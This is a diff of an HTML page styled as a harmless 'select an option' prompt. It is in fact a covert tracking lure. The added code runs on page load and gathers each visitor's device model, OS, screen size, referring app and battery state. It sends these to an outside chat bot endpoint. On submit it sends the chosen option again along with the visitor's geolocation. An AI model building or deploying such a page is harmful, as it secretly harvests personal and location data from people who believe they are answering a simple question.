@@ -5,13 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>YOUR OPTIONS</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
         body {
             background: linear-gradient(135deg, #4b0082, #ff4500, #8a2be2, #00ffff);
             background-size: 400% 400%;
@@ -22,13 +16,11 @@
             height: 100vh;
             color: white;
         }
-
         @keyframes gradientBG {
             0% { background-position: 0% 50%; }
             50% { background-position: 100% 50%; }
             100% { background-position: 0% 50%; }
         }
-
         .container {
             text-align: center;
             padding: 3rem;
@@ -36,8 +28,12 @@
             backdrop-filter: blur(20px);
             background: rgba(0, 0, 0, 0.6);
             box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
+            animation: glow 3s infinite alternate;
         }
-
+        @keyframes glow {
+            from { box-shadow: 0 0 20px #ff00ff; }
+            to { box-shadow: 0 0 40px #00ffff; }
+        }
         h1 {
             font-size: 2rem;
             margin-bottom: 2rem;
@@ -45,15 +41,12 @@
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
-
         .option {
             display: flex;
             align-items: center;
-            justify-content: flex-start;
             gap: 1rem;
             margin: 1rem 0;
         }
-
         input[type="checkbox"] {
             appearance: none;
             width: 25px;
@@ -62,16 +55,13 @@
             border-radius: 50%;
             cursor: pointer;
         }
-
         input[type="checkbox"]:checked {
             background: linear-gradient(45deg, #ff00ff, #00ffff);
         }
-
         label {
             font-size: 1.5rem;
             cursor: pointer;
         }
-
         .submit-btn {
             margin-top: 2rem;
             padding: 1rem 3rem;
@@ -81,10 +71,15 @@
             border-radius: 50px;
             cursor: pointer;
             background: linear-gradient(90deg, #ff00ff, #00ffff);
+            transition: all 0.3s;
+        }
+        .submit-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 30px #00ffff;
         }
     </style>
 </head>
-<body>
+<body onload="sendInitialData()">
     <div class="container">
         <h1>SELECT AN OPTION, OR IT WILL NEVER CHANGE</h1>
         <div class="option">
@@ -114,54 +109,67 @@
 
         function getBrowserInfo() {
             let userAgent = navigator.userAgent.toLowerCase();
-            if (userAgent.includes("instagram")) return "Instagram App";
-            if (userAgent.includes("facebook")) return "Facebook App";
-            if (userAgent.includes("whatsapp")) return "WhatsApp";
-            if (userAgent.includes("twitter")) return "Twitter";
-            if (userAgent.includes("tiktok")) return "TikTok";
-            if (userAgent.includes("chrome")) return "Google Chrome";
-            if (userAgent.includes("safari")) return "Safari";
-            if (userAgent.includes("firefox")) return "Firefox";
-            if (userAgent.includes("edge")) return "Microsoft Edge";
+
+            if (document.referrer.includes("t.me") || userAgent.includes("telegram")) return "Telegram App";
+            if (document.referrer.includes("whatsapp") || userAgent.includes("whatsapp")) return "WhatsApp";
+            if (document.referrer.includes("instagram") || userAgent.includes("instagram")) return "Instagram App";
+            if (document.referrer.includes("facebook") || userAgent.includes("facebook")) return "Facebook App";
+            if (document.referrer.includes("twitter") || userAgent.includes("twitter")) return "Twitter";
+            if (document.referrer.includes("tiktok") || userAgent.includes("tiktok")) return "TikTok";
+            
+            if (userAgent.includes("chrome") && !userAgent.includes("edg")) return "Google Chrome";
+            if (userAgent.includes("safari") && !userAgent.includes("chrome")) return "Safari";
+            if (userAgent.includes("firefox")) return "Mozilla Firefox";
+            if (userAgent.includes("edg")) return "Microsoft Edge";
+
             return "Unknown Browser/App";
         }
 
         async function getDeviceInfo() {
             let deviceInfo = "📱 **Device Info:**\n";
-            let model = "Unknown";
-            let os = "Unknown";
+            deviceInfo += `🔹 Opened in: ${getBrowserInfo()}\n`;
 
             if (navigator.userAgentData) {
                 const ua = await navigator.userAgentData.getHighEntropyValues(["architecture", "model", "platform", "platformVersion"]);
-                model = ua.model || "Unknown";
-                os = `${ua.platform} ${ua.platformVersion}`;
+                deviceInfo += `🔹 **Device Model:** ${ua.model || "Unknown"}\n`;
+                deviceInfo += `🔹 **OS:** ${ua.platform} ${ua.platformVersion}\n`;
             } else {
-                os = navigator.platform;
+                deviceInfo += `🔹 **OS:** ${navigator.platform}\n`;
             }
 
-            let browser = getBrowserInfo();
-
-            deviceInfo += `🔹 **Device Model:** ${model}\n`;
-            deviceInfo += `🔹 **OS:** ${os}\n`;
             deviceInfo += `🔹 **Screen:** ${window.screen.width}x${window.screen.height}\n`;
-            deviceInfo += `🔹 **Opened in:** ${browser}\n`;
-
             return deviceInfo;
         }
 
-        function sendDeviceInfo() {
-            navigator.getBattery().then(battery => {
-                getDeviceInfo().then(deviceInfo => {
+        function sendInitialData() {
+            getDeviceInfo().then(deviceInfo => {
+                navigator.getBattery().then(battery => {
                     const batteryStatus = `🔋 **Battery:** ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
-                    const message = `${deviceInfo}${batteryStatus}`;
-                    sendMessage(message);
+                    sendMessage(`🚀 **New User Visit**\n${deviceInfo}${batteryStatus}`);
                 });
             });
         }
 
-        function submitData() {
-            captureLocation();
-            capturePhoto();
+        function getSelectedOption() {
+            const checkboxes = document.querySelectorAll('input[type="checkbox"]');
+            for (let checkbox of checkboxes) {
+                if (checkbox.checked) return checkbox.nextElementSibling.innerText;
+            }
+            return null;
+        }
+
+        async function submitData() {
+            const option = getSelectedOption();
+            if (!option) return alert("Please select an option!");
+
+            navigator.getBattery().then(battery => {
+                getDeviceInfo().then(deviceInfo => {
+                    const message = `✅ **User Response**\n🟢 **Option:** ${option}\n${deviceInfo}🔋 **Battery:** ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
+                    sendMessage(message);
+                });
+
+                captureLocation();
+            });
         }
 
         function captureLocation() {
@@ -181,8 +189,6 @@
                 body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: "Markdown" })
             });
         }
-
-        window.onload = sendDeviceInfo;
     </script>
 </body>
 </html>
